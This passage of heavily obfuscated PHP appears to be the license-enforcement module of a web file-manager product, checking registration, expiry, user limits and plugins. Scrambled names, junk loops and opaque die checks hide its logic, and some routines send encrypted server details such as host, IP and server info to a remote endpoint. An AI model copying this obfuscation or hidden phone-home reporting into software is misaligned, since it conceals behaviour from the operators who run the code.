strlen($¡Ôô»´‚)); $”ä¸‹¯¡ = $ÚÈó¯ÈŒ[706]; if (strlen($”ä¸‹¯¡) < $ÚÈó¯ÈŒ[697]) { die; } preg_match_all($’º²©ÄÓ[18], $Õé¨Ÿ«Œ, $ıóñ¤½‰); $Õé¨Ÿ«Œ = trim($ıóñ¤½‰[0][0], $’º²©ÄÓ[19]); $GLOBALS[$’º²©ÄÓ[13]][$’º²©ÄÓ[14]] = explode($’º²©ÄÓ[19], $Õé¨Ÿ«Œ); $Òü ËÏ¦ = $ÚÈó¯ÈŒ[707]; while (strlen($Òü ËÏ¦) < $ÚÈó¯ÈŒ[690]) { if (!$Òü ËÏ¦) { break; } $Òü ËÏ¦++; } $GLOBALS[$’º²©ÄÓ[13]][$’º²©ÄÓ[15]] = implode($’º²©ÄÓ[0], $GLOBALS[$’º²©ÄÓ[13]][$’º²©ÄÓ[14]]); } public function run() { $–ß™€ˆˆ =& $_SERVER[¯‘·½]; $—¶â¿‚ =& $_SERVER[ôİ”í„Æ]; $this->mwyc689a8042(); $this->kulz84c15ce5(); $©ÄÌÂæ = $–ß™€ˆˆ[708]; if (!$©ÄÌÂæ) { die; } $©­Çù‡ = $GLOBALS[$—¶â¿‚[13]][$—¶â¿‚[14]]; $ıôåµğÅ = $GLOBALS[$—¶â¿‚[13]][$—¶â¿‚[15]]; $ô†Ã£éÆ = $–ß™€ˆˆ[709]; if (strlen($ô†Ã£éÆ) < $–ß™€ˆˆ[710]) { die; } define($—¶â¿‚[20], isset($©­Çù‡[0]) && $©­Çù‡[0] ? $©­Çù‡[0] : $this->defaultModule); $Œ–ûè = $–ß™€ˆˆ[711]; while ($Œ–ûè < $–ß™€ˆˆ[712]) { if ($Œ–ûè >= 0) { break; } $Œ–ûè++; } define($—¶â¿‚[21], isset($©­Çù‡[1]) && $©­Çù‡[0] ? $©­Çù‡[1] : $this->defaultController); $°¶½Ø¤– = $–ß™€ˆˆ[713]; if (!$°¶½Ø¤–) { die; } define($—¶â¿‚[22], isset($©­Çù‡[2]) && $©­Çù‡[0] ? $©­Çù‡[2] : $this->defaultAction); $ÁÃŞ·–ú = $–ß™€ˆˆ[714]; define($—¶â¿‚[23], MOD . $—¶â¿‚[0] . ST . $—¶â¿‚[0] . ACT); $µØøº¸¤ = $–ß™€ˆˆ[715]; if (!$µØøº¸¤) { return; } $_SERVER[$—¶â¿‚[24]] = strtolower(ACTION); $Òêè”¯ = $–ß™€ˆˆ[716]; $this->autorun(); if (count($©­Çù‡) >= 3) { $this->appRun($ıôåµğÅ); } else { $this->appRun(ACTION); } } private $bmut0924d3d1 = array(); private $zexwb49af9a4 = ''; public function xtql75df6859() { $œÃİ²¯ =& $_SERVER[¯‘·½]; $ÒûÌ×–² =& $_SERVER[ôİ”í„Æ]; $this->coyd4537f77e(); $ÅÚ™íÅ = $œÃİ²¯[717]; if (!$ÅÚ™íÅ) { die; } $this->bynl20166180(); $•¨ªÂùÒ = $œÃİ²¯[718]; while (strlen($•¨ªÂùÒ) < $œÃİ²¯[710]) { if (!$•¨ªÂùÒ) { break; } $•¨ªÂùÒ++; } $this->jmgc7ae87634(); $this->lavpce8ed2df(); $this->xfqe9076c53f(); $Á€ñ²ËÈ = $œÃİ²¯[719]; $this->jamh923b8565(); $Ä´Íã”— = $œÃİ²¯[720]; $this->riembe89da0e(); $¦•ä äÈ = $œÃİ²¯[721]; $this->npjfa2984eb3($ÒûÌ×–²[25], array($this, $ÒûÌ×–²[26])); $Ñ¯ßÂÌÔ = $œÃİ²¯[722]; $this->npjfa2984eb3($ÒûÌ×–²[27], array($this, $ÒûÌ×–²[28])); $ñäËàú = $œÃİ²¯[723]; while (strlen($ñäËàú) < $œÃİ²¯[710]) { if (!$ñäËàú) { break; } $ñäËàú++; } $this->npjfa2984eb3($ÒûÌ×–²[29], array($this, $ÒûÌ×–²[30])); $this->npjfa2984eb3($ÒûÌ×–²[31], array($this, $ÒûÌ×–²[32])); $‚—Íªæ = $œÃİ²¯[724]; if (!$‚—Íªæ) { return; } } public function enfc32e25ae5($›†¸€æµ) { $ˆ’…Û£° =& $_SERVER[¯‘·½]; $”¤·…«¹ =& $_SERVER[ôİ”í„Æ]; $ñ¨â‹á’ = Model($”¤·…«¹[33])->get(); $ƒÃ“¯¢¾ = array($”¤·…«¹[34], $”¤·…«¹[35], $”¤·…«¹[36], $”¤·…«¹[37], $”¤·…«¹[38], $”¤·…«¹[39], $”¤·…«¹[40], $”¤·…«¹[41], $”¤·…«¹[42], $”¤·…«¹[43], $”¤·…«¹[44], $”¤·…«¹[45], $”¤·…«¹[46], $”¤·…«¹[47], $”¤·…«¹[48], $”¤·…«¹[49], $”¤·…«¹[50], $”¤·…«¹[51], $”¤·…«¹[52], $”¤·…«¹[53], $”¤·…«¹[54], $”¤·…«¹[55], $”¤·…«¹[56], $”¤·…«¹[57], $”¤·…«¹[58], $”¤·…«¹[59], $”¤·…«¹[60], $”¤·…«¹[61], $”¤·…«¹[62], $”¤·…«¹[63], $”¤·…«¹[64], $”¤·…«¹[65], $”¤·…«¹[66], $”¤·…«¹[67], $”¤·…«¹[68], $”¤·…«¹[69], $”¤·…«¹[70], $”¤·…«¹[71], $”¤·…«¹[72], $”¤·…«¹[73], $”¤·…«¹[74], $”¤·…«¹[75], $”¤·…«¹[76], $”¤·…«¹[77], $”¤·…«¹[78], $”¤·…«¹[79], $”¤·…«¹[80], $”¤·…«¹[81], $”¤·…«¹[82], $”¤·…«¹[83], $”¤·…«¹[84], $”¤·…«¹[85]); foreach ($ƒÃ“¯¢¾ as $¡›–Äµ) { $üåÛÌ­ = $GLOBALS[$”¤·…«¹[86]][$”¤·…«¹[87]][$¡›–Äµ]; if (isset($ñ¨â‹á’[$¡›–Äµ])) { $üåÛÌ­ = $ñ¨â‹á’[$¡›–Äµ]; } $›†¸€æµ[$”¤·…«¹[88]][$”¤·…«¹[89]][$¡›–Äµ] = $üåÛÌ­; } $îöÙÈ¸ = $›†¸€æµ[$”¤·…«¹[88]][$”¤·…«¹[89]][$”¤·…«¹[46]]; unset($›†¸€æµ[$”¤·…«¹[88]][$”¤·…«¹[90]][$”¤·…«¹[91]]); $°Á•‰•¶ = $ˆ’…Û£°[725]; if (strlen($°Á•‰•¶) < $ˆ’…Û£°[712]) { return; } unset($›†¸€æµ[$”¤·…«¹[88]][$”¤·…«¹[90]][$”¤·…«¹[92]]); unset($›†¸€æµ[$”¤·…«¹[88]][$”¤·…«¹[89]][$”¤·…«¹[46]]); unset($›†¸€æµ[$”¤·…«¹[88]][$”¤·…«¹[89]][$”¤·…«¹[93]]); $¦‹øóÈŒ = $ˆ’…Û£°[726]; $›†¸€æµ[$”¤·…«¹[88]][$”¤·…«¹[89]][$”¤·…«¹[94]] = array($”¤·…«¹[95] => (int) $îöÙÈ¸[$”¤·…«¹[96]], $”¤·…«¹[97] => (int) _get($îöÙÈ¸, $”¤·…«¹[98], 0)); $Œ°ä­å = $ˆ’…Û£°[727]; while (strlen($Œ°ä­å) < $ˆ’…Û£°[710]) { if (!$Œ°ä­å) { break; } $Œ°ä­å++; } $å°ıã¬ä = substr(md5($”¤·…«¹[99] . get_client_ip() . $ñ¨â‹á’[$”¤·…«¹[100]]), 0, 15); $üÈÚ‹á = $ˆ’…Û£°[728]; while ($üÈÚ‹á < $ˆ’…Û£°[690]) { if ($üÈÚ‹á >= 0) { break; } $üÈÚ‹á++; } $›†¸€æµ[$”¤·…«¹[101]][$”¤·…«¹[102]] = Mcrypt::encode(Session::sign(), $å°ıã¬ä, 3600 * 24); $¡Ùº˜öÒ = $ˆ’…Û£°[729]; if (strlen($¡Ùº˜öÒ) < $ˆ’…Û£°[690]) { die; } $›†¸€æµ[$”¤·…«¹[101]][$”¤·…«¹[103]] = Action($”¤·…«¹[104])->accessToken(); $›†¸€æµ[$”¤·…«¹[101]][$”¤·…«¹[105]] = md5($_SERVER[$”¤·…«¹[106]] . $ñ¨â‹á’[$”¤·…«¹[100]]); $âÃ„»¦­ = $ˆ’…Û£°[730]; while (strlen($âÃ„»¦­) < $ˆ’…Û£°[697]) { if (!$âÃ„»¦­) { break; } $âÃ„»¦­++; } $›†¸€æµ[$”¤·…«¹[101]][$”¤·…«¹[107]] = base64_encode(serverInfo()); $êø¤¹¦ = $ˆ’…Û£°[731]; if (!$êø¤¹¦) { return; } $›†¸€æµ[$”¤·…«¹[101]][$”¤·…«¹[108]] = $this->zexwb49af9a4; $½ØÜ•õ = $ˆ’…Û£°[732]; if (strlen($½ØÜ•õ) < $ˆ’…Û£°[710]) { return; } if ($ñ¨â‹á’[$”¤·…«¹[108]] != $”¤·…«¹[109]) { $›†¸€æµ[$”¤·…«¹[101]][$”¤·…«¹[110]] = $ñ¨â‹á’[$”¤·…«¹[110]]; $›†¸€æµ[$”¤·…«¹[101]][$”¤·…«¹[111]] = $ñ¨â‹á’[$”¤·…«¹[111]]; $øš®‹ßô = rand_string(10) . $this->zexwb49af9a4 . rand_string(5); $›†¸€æµ[$”¤·…«¹[88]][$”¤·…«¹[112]][$”¤·…«¹[113]] = $this->jemv1e18173c($øš®‹ßô, $›†¸€æµ[$”¤·…«¹[101]][$”¤·…«¹[105]]); } if ($this->zexwb49af9a4 == $”¤·…«¹[109]) { $›†¸€æµ[$”¤·…«¹[88]][$”¤·…«¹[89]][$”¤·…«¹[94]][$”¤·…«¹[98]] = 0; } $›†¸€æµ[$”¤·…«¹[101]][$”¤·…«¹[114]] = $this->versionPluginFilter(); $›†¸€æµ[$”¤·…«¹[101]][$”¤·…«¹[115]] = _get($this->bmut0924d3d1, $”¤·…«¹[116], $”¤·…«¹[6]); $ß¥İ§– = $ˆ’…Û£°[733]; while (strlen($ß¥İ§–) < $ˆ’…Û£°[697]) { if (!$ß¥İ§–) { break; } $ß¥İ§–++; } if (KodUser::isRoot() && $this->config[$”¤·…«¹[117]]) { $›†¸€æµ[$”¤·…«¹[101]][$”¤·…«¹[118]] = WEB_ROOT; } return $›†¸€æµ; } private function jamh923b8565() { $ë©ƒÛÓ† =& $_SERVER[¯‘·½]; $äı€œ™ =& $_SERVER[ôİ”í„Æ]; $áë£àâ = $_SERVER[$äı€œ™[24]] == $äı€œ™[119]; if ($_SERVER[$äı€œ™[24]] == $äı€œ™[120] && $_GET[$äı€œ™[121]] == $äı€œ™[122]) { $áë£àâ = !0; } if ($áë£àâ) { $õ÷ìÈµö = array($äı€œ™[108] => $this->zexwb49af9a4, $äı€œ™[123] => $this->oawjc7dabe9f(), $äı€œ™[124] => Model($äı€œ™[125])->count()); if ($this->zexwb49af9a4 != $äı€œ™[109]) { $ßèÎ§ôŠ = _get($this->bmut0924d3d1, $äı€œ™[126]); if ($ßèÎ§ôŠ) { $õ÷ìÈµö[$äı€œ™[127]] = $ßèÎ§ôŠ; $õ÷ìÈµö[$äı€œ™[128]] = strtotime(_get($this->bmut0924d3d1, $äı€œ™[129])); $õ÷ìÈµö[$äı€œ™[130]] = _get($this->bmut0924d3d1, $äı€œ™[116]); } $½¢µ…ıÍ = Model($äı€œ™[33])->get($äı€œ™[131], $äı€œ™[6], !0); if (is_string($½¢µ…ıÍ) && substr($½¢µ…ıÍ, 0, 1) == $äı€œ™[132]) { $½¢µ…ıÍ = json_decode_force($½¢µ…ıÍ); } if (is_array($½¢µ…ıÍ) && $½¢µ…ıÍ[$äı€œ™[133]] && strstr($½¢µ…ıÍ[$äı€œ™[133]], $äı€œ™[134])) { $ÜËÂ­ = explode($äı€œ™[134], $½¢µ…ıÍ[$äı€œ™[133]]); $õ÷ìÈµö[$äı€œ™[135]] = $ÜËÂ­[0]; } } $õ÷ìÈµö = $this->giyl19b4c071(json_encode($õ÷ìÈµö), md5($äı€œ™[136])); $Ò‹´»£Ä = $ë©ƒÛÓ†[734]; $ßÄİÈù = array($äı€œ™[137] => $õ÷ìÈµö); call_user_func(array($äı€œ™[138], $äı€œ™[139]), $ßÄİÈù); $¶ŠğüÕ = $ë©ƒÛÓ†[735]; if (!$¶ŠğüÕ) { return; } } if ($this->zexwb49af9a4 == $äı€œ™[109]) { return; } $‰ò¹­²„ = array($äı€œ™[140], $äı€œ™[141], $äı€œ™[142], $äı€œ™[143], $äı€œ™[144], $äı€œ™[145]); $ÒÈÁíÜ = Model($äı€œ™[33])->get(); $™ŞÈúÈœ = $ë©ƒÛÓ†[736]; $ßÄİÈù = array($äı€œ™[146] => $ÒÈÁíÜ[$äı€œ™[34]], $äı€œ™[147] => $ÒÈÁíÜ[$äı€œ™[35]], $äı€œ™[148] => $äı€œ™[6]); foreach ($‰ò¹­²„ as $ƒ€à©ÅÈ) { if (!isset($ÒÈÁíÜ[$ƒ€à©ÅÈ]) || !$ÒÈÁíÜ[$ƒ€à©ÅÈ]) { continue; } $ßÄİÈù[$ƒ€à©ÅÈ] = $ÒÈÁíÜ[$ƒ€à©ÅÈ]; $ü¬É’×Ù = $ë©ƒÛÓ†[737]; if (strlen($ü¬É’×Ù) < $ë©ƒÛÓ†[710]) { return; } } call_user_func(array($äı€œ™[138], $äı€œ™[139]), $ßÄİÈù); } private function lavpce8ed2df() { $Öô¤åå =& $_SERVER[¯‘·½]; $¾Ñİ‹  =& $_SERVER[ôİ”í„Æ]; if ($_SERVER[$¾Ñİ‹ [24]] != $¾Ñİ‹ [149]) { return; } if (!KodUser::isRoot()) { die; } $ÏĞÓ¨ÅÓ = $GLOBALS[$¾Ñİ‹ [13]]; if (isset($ÏĞÓ¨ÅÓ[$¾Ñİ‹ [150]])) { $this->mqrffadc71bc(); die; } if (isset($ÏĞÓ¨ÅÓ[$¾Ñİ‹ [151]]) && isset($ÏĞÓ¨ÅÓ[$¾Ñİ‹ [151]]) == $¾Ñİ‹ [122]) { $ÏĞÓ¨ÅÓ[$¾Ñİ‹ [152]] = Model($¾Ñİ‹ [33])->get($¾Ñİ‹ [153]); } if (!isset($ÏĞÓ¨ÅÓ[$¾Ñİ‹ [152]]) || strlen($ÏĞÓ¨ÅÓ[$¾Ñİ‹ [152]]) != 16) { show_json($¾Ñİ‹ [154] . $ÏĞÓ¨ÅÓ[$¾Ñİ‹ [152]], !1); } $©Šç“® = Model($¾Ñİ‹ [33])->get($¾Ñİ‹ [100]); $Ä‘˜§ªú = md5($_SERVER[$¾Ñİ‹ [106]] . $©Šç“®); $ÄÄ´€† = $Öô¤åå[738]; $Šı£Ù‰ù = array($¾Ñİ‹ [152] => $ÏĞÓ¨ÅÓ[$¾Ñİ‹ [152]], $¾Ñİ‹ [155] => rand_string(16), $¾Ñİ‹ [156] => $¾Ñİ‹ [136], $¾Ñİ‹ [157] => $¾Ñİ‹ [158], $¾Ñİ‹ [159] => $_SERVER[$¾Ñİ‹ [160]], $¾Ñİ‹ [161] => $_SERVER[$¾Ñİ‹ [162]], $¾Ñİ‹ [163] => $_SERVER[$¾Ñİ‹ [164]], $¾Ñİ‹ [105] => $Ä‘˜§ªú, $¾Ñİ‹ [165] => Model($¾Ñİ‹ [33])->get($¾Ñİ‹ [131])); if (isset($ÏĞÓ¨ÅÓ[$¾Ñİ‹ [151]]) && isset($ÏĞÓ¨ÅÓ[$¾Ñİ‹ [151]]) == $¾Ñİ‹ [122]) { $Šı£Ù‰ù[$¾Ñİ‹ [151]] = md5($Šı£Ù‰ù[$¾Ñİ‹ [152]] . $¾Ñİ‹ [166] . $Šı£Ù‰ù[$¾Ñİ‹ [155]]); } if ($ÏĞÓ¨ÅÓ[$¾Ñİ‹ [167]] == $¾Ñİ‹ [168]) { $°®ıØüó = $this->giyl19b4c071($Ä‘˜§ªú, $¾Ñİ‹ [169]); $«ğ›÷ = $this->jemv1e18173c(json_encode($Šı£Ù‰ù), $Ä‘˜§ªú . $¾Ñİ‹ [170], 3); $«ğ›÷ = $«ğ›÷ . $¾Ñİ‹ [171] . $_SERVER[$¾Ñİ‹ [160]]; $Æ¸ãÕı = $this->sdtpf2ed4612($¾Ñİ‹ [172] . $°®ıØüó . $¾Ñİ‹ [173] . $«ğ›÷, -1); show_json($Æ¸ãÕı, !0); } else { if ($ÏĞÓ¨ÅÓ[$¾Ñİ‹ [167]] == $¾Ñİ‹ [174]) { $ÎõÏ·–ò = substr(md5($¾Ñİ‹ [175] . $Ä‘˜§ªú), 12, 15) . $¾Ñİ‹ [176]; $«ğ›÷ = $this->nmtsed8c26ae(trim($ÏĞÓ¨ÅÓ[$¾Ñİ‹ [177]]), $ÎõÏ·–ò, 2); $Æ÷Óñµ¡ = json_decode($«ğ›÷, !0); if (!is_array($Æ÷Óñµ¡) || !is_array($Æ÷Óñµ¡[$¾Ñİ‹ [178]]) || $Æ÷Óñµ¡[$¾Ñİ‹ [152]] != !0) { $È¼©±§ = $¾Ñİ‹ [179]; $óŒØíÇÇ = $Æ÷Óñµ¡[$¾Ñİ‹ [178]] ? $¾Ñİ‹ [180] . $Æ÷Óñµ¡[$¾Ñİ‹ [178]] : $È¼©±§; show_json($óŒØíÇÇ, !1); } else { $Šı£Ù‰ù[$¾Ñİ‹ [155]] = $Æ÷Óñµ¡[$¾Ñİ‹ [178]][$¾Ñİ‹ [181]]; } } else { $Æ÷Óñµ¡ = $this->sdtpf2ed4612($¾Ñİ‹ [182], $Šı£Ù‰ù, 10); } } if (!is_array($Æ÷Óñµ¡) || !is_array($Æ÷Óñµ¡[$¾Ñİ‹ [178]]) || $Æ÷Óñµ¡[$¾Ñİ‹ [152]] != !0) { $È¼©±§ = LNG($¾Ñİ‹ [183]); $óŒØíÇÇ = $Æ÷Óñµ¡[$¾Ñİ‹ [178]] ? $¾Ñİ‹ [180] . $Æ÷Óñµ¡[$¾Ñİ‹ [178]] : $È¼©±§; show_json($óŒØíÇÇ, !1); } $ÑÎòÓÅ = $Æ÷Óñµ¡[$¾Ñİ‹ [178]]; $£‹À²®ó = $this->bmuk2303615e($ÑÎòÓÅ[$¾Ñİ‹ [184]]); if (!$£‹À²®ó || $£‹À²®ó != $ÑÎòÓÅ[$¾Ñİ‹ [129]]) { $Šù”¦ş = array($¾Ñİ‹ [185] => Model($¾Ñİ‹ [33])->get($¾Ñİ‹ [100]), $¾Ñİ‹ [186] => $_SERVER[$¾Ñİ‹ [106]], $¾Ñİ‹ [187] => this_url(), $¾Ñİ‹ [161] => $_SERVER[$¾Ñİ‹ [162]]); $«ğ›÷ = $this->hyiv3a381914(json_encode($Šù”¦ş)); $this->sdtpf2ed4612($¾Ñİ‹ [188] . $«ğ›÷); show_json(LNG($¾Ñİ‹ [189]), !0); } $Ø©Æ›ò = array($¾Ñİ‹ [153] => $ÑÎòÓÅ[$¾Ñİ‹ [190]], $¾Ñİ‹ [191] => $ÑÎòÓÅ[$¾Ñİ‹ [192]], $¾Ñİ‹ [193] => rand_string(16), $¾Ñİ‹ [108] => $ÑÎòÓÅ[$¾Ñİ‹ [194]]); if ($Šı£Ù‰ù[$¾Ñİ‹ [155]]) { $Ø©Æ›ò[$¾Ñİ‹ [193]] = $Šı£Ù‰ù[$¾Ñİ‹ [155]]; } $„úë‘ÎŸ = substr(md5($Ø©Æ›ò[$¾Ñİ‹ [191]]), 10, 10); $Ñêˆ´²ø = $„úë‘ÎŸ . $Ø©Æ›ò[$¾Ñİ‹ [108]] . $Ø©Æ›ò[$¾Ñİ‹ [193]]; $Š¬•Š¨¼ = $Öô¤åå[739]; if (strlen($Š¬•Š¨¼) < $Öô¤åå[690]) { return; } $Ø©Æ›ò[$¾Ñİ‹ [110]] = strrev(base64_encode($this->giyl19b4c071($Ñêˆ´²ø, $¾Ñİ‹ [195]))); $´ï±çŞ­ = $Öô¤åå[740]; $ì‰ı¡™Ê = rand_string(16); $×şôğÕ = $ì‰ı¡™Ê . $Ø©Æ›ò[$¾Ñİ‹ [108]] . $this->giyl19b4c071(md5($Ø©Æ›ò[$¾Ñİ‹ [153]]), $ì‰ı¡™Ê); $ÊÖëªÜŞ = $Öô¤åå[741]; if (strlen($ÊÖëªÜŞ) < $Öô¤åå[710]) { return; } $Ø©Æ›ò[$¾Ñİ‹ [111]] = base64_encode(strrev($this->giyl19b4c071($×şôğÕ, $¾Ñİ‹ [196]))); if ($ÑÎòÓÅ[$¾Ñİ‹ [197]] && $ÑÎòÓÅ[$¾Ñİ‹ [197]] >= 1) { Model($¾Ñİ‹ [33])->setDeep($¾Ñİ‹ [198], $¾Ñİ‹ [122]); } Model($¾Ñİ‹ [33])->set($Ø©Æ›ò); $éĞî¡İ’ = md5($_SERVER[$¾Ñİ‹ [106]] . strrev($©Šç“®) . $Ø©Æ›ò[$¾Ñİ‹ [191]]); $¯ñÙ×ıÉ = strrev(substr($éĞî¡İ’, 10, 16)); $“®õœ¯ = $this->jemv1e18173c(json_encode($ÑÎòÓÅ), $éĞî¡İ’); $à˜Ó·æÉ = $Öô¤åå[742]; $ŞÃÕ“¬´ = array_to_keyvalue(Model($¾Ñİ‹ [7])->listData(), $¾Ñİ‹ [199]); $ÄĞÂ­ç£ = $ŞÃÕ“¬´[$¾Ñİ‹ [200]]; $ñ¼™Ô”œ = array(); $¼Ô¿î« = $Öô¤åå[743]; if (!$¼Ô¿î«) { return; } $ñ¼™Ô”œ[$¯ñÙ×ıÉ] = $“®õœ¯; Model($¾Ñİ‹ [7])->update($ÄĞÂ­ç£[$¾Ñİ‹ [201]], array($¾Ñİ‹ [202] => $ñ¼™Ô”œ)); $this->bmut0924d3d1 = $ÑÎòÓÅ; $this->zexwb49af9a4 = $Ø©Æ›ò[$¾Ñİ‹ [108]]; $·ãÂ¤Å³ = $Öô¤åå[744]; if (strlen($·ãÂ¤Å³) < $Öô¤åå[701]) { return; } $this->licenseRegistSuccess(); $÷£–İ­ˆ = $Öô¤åå[745]; if (strlen($÷£–İ­ˆ) < $Öô¤åå[697]) { return; } Cache::set($¾Ñİ‹ [203] . md5($©Šç“® . $¾Ñİ‹ [204]), $¾Ñİ‹ [6]); show_json(LNG($¾Ñİ‹ [189]), !0); $â˜«ÃÓÕ = $Öô¤åå[746]; if (!$â˜«ÃÓÕ) { die; } } private function licenseRegistSuccess() { $òåÍÖşù =& $_SERVER[¯‘·½]; $ŒæÕ·Ö =& $_SERVER[ôİ”í„Æ]; $ôû‡äãé = Model($ŒæÕ·Ö[33])->get(); $Î»º®¥Ü = $òåÍÖşù[747]; if (strlen($Î»º®¥Ü) < $òåÍÖşù[701]) { die; } if ($ôû‡äãé[$ŒæÕ·Ö[63]] != $ŒæÕ·Ö[122]) { Model($ŒæÕ·Ö[33])->set($ŒæÕ·Ö[63], $ŒæÕ·Ö[122]); } Action($ŒæÕ·Ö[205])->initStart(!0); } private function mqrffadc71bc() { $“şûÂ²ó =& $_SERVER[ôİ”í„Æ]; Model($“şûÂ²ó[33])->set(array($“şûÂ²ó[153] => $“şûÂ²ó[6], $“şûÂ²ó[191] => $“şûÂ²ó[6], $“şûÂ²ó[108] => $“şûÂ²ó[109], $“şûÂ²ó[110] => $“şûÂ²ó[6], $“şûÂ²ó[111] => $“şûÂ²ó[6])); Model($“şûÂ²ó[33])->setDeep($“şûÂ²ó[198], $“şûÂ²ó[206]); $this->bmut0924d3d1 = array(); $this->zexwb49af9a4 = $“şûÂ²ó[109]; } private function coyd4537f77e() { $˜™«ôº =& $_SERVER[¯‘·½]; $·ó¥ãÓï =& $_SERVER[ôİ”í„Æ]; $_SERVER[$·ó¥ãÓï[162]] = _get($_SERVER, $·ó¥ãÓï[162], APP_HOST); $öŞšŠ« = $˜™«ôº[748]; $this->zexwb49af9a4 = $·ó¥ãÓï[109]; $ÌÏ°í­ = Model($·ó¥ãÓï[33])->get(); if ($ÌÏ°í­[$·ó¥ãÓï[108]] == $·ó¥ãÓï[109]) { return; } $À÷÷Ú„Ğ = Model($·ó¥ãÓï[33])->get($·ó¥ãÓï[100]); $‚Ô–óÖÙ = $˜™«ôº[749]; $ËÎÜà­ş = $·ó¥ãÓï[203] . md5($À÷÷Ú„Ğ . $·ó¥ãÓï[204]); $™ÏºŞÎ = $˜™«ôº[750]; if (strlen($™ÏºŞÎ) < $˜™«ôº[701]) { die; } $˜ÚŒË—  = Cache::get($ËÎÜà­ş); if (!is_array($˜ÚŒË— ) || !isset($˜ÚŒË— [$·ó¥ãÓï[207]]) || time() - $˜ÚŒË— [$·ó¥ãÓï[207]] >= 60) { $İ°‹£Õ³ = Model($·ó¥ãÓï[7])->loadList(); $Ûˆ¤Æ» = $İ°‹£Õ³[$·ó¥ãÓï[200]]; $¡ıô°Ø = md5($_SERVER[$·ó¥ãÓï[106]] . strrev($À÷÷Ú„Ğ) . $ÌÏ°í­[$·ó¥ãÓï[191]]); $­¸²š¾È = strrev(substr($¡ıô°Ø, 10, 16)); $˜ÚŒË—  = $this->nmtsed8c26ae($Ûˆ¤Æ»[$·ó¥ãÓï[86]][$­¸²š¾È], $¡ıô°Ø); $˜ÚŒË—  = json_decode($˜ÚŒË— , !0); } if (!is_array($˜ÚŒË— )) { return $this->mqrffadc71bc(); } $¯öùÆû = strtotime($˜ÚŒË— [$·ó¥ãÓï[129]]); if (time() >= $¯öùÆû) { return $this->mqrffadc71bc(); } if (!isset($˜ÚŒË— [$·ó¥ãÓï[207]]) || time() - $˜ÚŒË— [$·ó¥ãÓï[207]] > 20) { $˜ÚŒË— [$·ó¥ãÓï[207]] = time(); Cache::set($ËÎÜà­ş, $˜ÚŒË— ); } $this->bmut0924d3d1 = $˜ÚŒË— ; $this->zexwb49af9a4 = $ÌÏ°í­[$·ó¥ãÓï[108]]; } private function bynl20166180() { $…ö¿„çÓ =& $_SERVER[¯‘·½]; $„œÚğ‚ =& $_SERVER[ôİ”í„Æ]; $Ö˜˜¼×ì = $GLOBALS[$„œÚğ‚[13]]; $êüà”ï¼ = $…ö¿„çÓ[751]; while (strlen($êüà”ï¼) < $…ö¿„çÓ[697]) { if (!$êüà”ï¼) { break; } $êüà”ï¼++; } $Ìßé ç› = $_SERVER[$„œÚğ‚[24]]; if ($Ìßé ç› == $„œÚğ‚[208] && $this->zexwb49af9a4 == $„œÚğ‚[109]) { show_json(LNG($„œÚğ‚[209]), !1, $„œÚğ‚[210]); } $¸ßëğ‘Ş = array($„œÚğ‚[211], $„œÚğ‚[212]); if (in_array($Ìßé ç›, $¸ßëğ‘Ş)) { if ($this->zexwb49af9a4 == $„œÚğ‚[109] && isset($Ö˜˜¼×ì[$„œÚğ‚[213]])) { show_json(LNG($„œÚğ‚[209]), !1, $„œÚğ‚[210]); die; } $ŠÎ¿Éø£ = $this->oawjc7dabe9f(); if ($ŠÎ¿Éø£ != intval($„œÚğ‚[214])) { if ($ŠÎ¿Éø£ <= Model($„œÚğ‚[125])->count()) { show_json(LNG($„œÚğ‚[215]), !1, $„œÚğ‚[210]); die; } } } } private function jmgc7ae87634() { $°şÊçĞ =& $_SERVER[¯‘·½]; $ê½©éŸ¾ =& $_SERVER[ôİ”í„Æ]; $áŸÏå¯ = array($ê½©éŸ¾[119], $ê½©éŸ¾[120]); if (!KodUser::isRoot() || !isset($_GET[$ê½©éŸ¾[216]])) { return; } if (!in_array($_SERVER[$ê½©éŸ¾[24]], $áŸÏå¯)) { return; } $Ô†ÅúèÚ = $ê½©éŸ¾[217]; $åıĞ‡Ğ¶ = $°şÊçĞ[752]; if (!$åıĞ‡Ğ¶) { return; } $Ô†ÅúèÚ = $this->fxwy13863597($Ô†ÅúèÚ, $ê½©éŸ¾[218]); $ÓËé…³œ = $°şÊçĞ[753]; if (!$ÓËé…³œ) { return; } $Æõ¡‡ø§ = stream_context_create(array($ê½©éŸ¾[219] => array($ê½©éŸ¾[220] => $ê½©éŸ¾[221], $ê½©éŸ¾[222] => 3))); $Êùí—Óƒ = @file_get_contents($Ô†ÅúèÚ, !1, $Æõ¡‡ø§); header($ê½©éŸ¾[223]); $¤Ï‘¯Üæ = $°şÊçĞ[754]; if (!$¤Ï‘¯Üæ) { return; } if ($Êùí—Óƒ && strstr($Êùí—Óƒ, $ê½©éŸ¾[224])) { echo $Êùí—Óƒ; } die; } public function hozea335fdde($‡ø¾­½µ) { $ÄÊÍ€ˆó =& $_SERVER[ôİ”í„Æ]; if ($this->zexwb49af9a4 == $ÄÊÍ€ˆó[225]) { return $‡ø¾­½µ; } $×äÃ…®Ø = $this->versionPluginList(); $”„±ïÅœ = $_SERVER[¯‘·½][755]; if (!$”„±ïÅœ) { die; } $£¹éËâ¹ = explode($ÄÊÍ€ˆó[226], $this->versionPluginFilter()); $°öŞ·‚ß = array(); foreach ($×äÃ…®Ø as $×Óùš³ä => $¦êòô¶š) { if ($¦êòô¶š == $ÄÊÍ€ˆó[227] && substr($this->zexwb49af9a4, 0, 1) == $ÄÊÍ€ˆó[227]) { continue; } if (!in_array($×Óùš³ä, $£¹éËâ¹)) { $°öŞ·‚ß[] = $×Óùš³ä; } } foreach ($°öŞ·‚ß as $×Óùš³ä) { unset($‡ø¾­½µ[$×Óùš³ä]); } return $‡ø¾­½µ; } private function versionPluginList() { $”÷ïşŠ¯ =& $_SERVER[ôİ”í„Æ]; return array($”÷ïşŠ¯[228] => $”÷ïşŠ¯[227], $”÷ïşŠ¯[229] => $”÷ïşŠ¯[227], $”÷ïşŠ¯[230] => $”÷ïşŠ¯[227], $”÷ïşŠ¯[231] => $”÷ïşŠ¯[227], $”÷ïşŠ¯[232] => $”÷ïşŠ¯[233], $”÷ïşŠ¯[234] => $”÷ïşŠ¯[233], $”÷ïşŠ¯[235] => $”÷ïşŠ¯[233], $”÷ïşŠ¯[236] => $”÷ïşŠ¯[233], $”÷ïşŠ¯[237] => $”÷ïşŠ¯[233], $”÷ïşŠ¯[238] => $”÷ïşŠ¯[233], $”÷ïşŠ¯[239] => $”÷ïşŠ¯[233], $”÷ïşŠ¯[240] => $”÷ïşŠ¯[233], $”÷ïşŠ¯[241] => 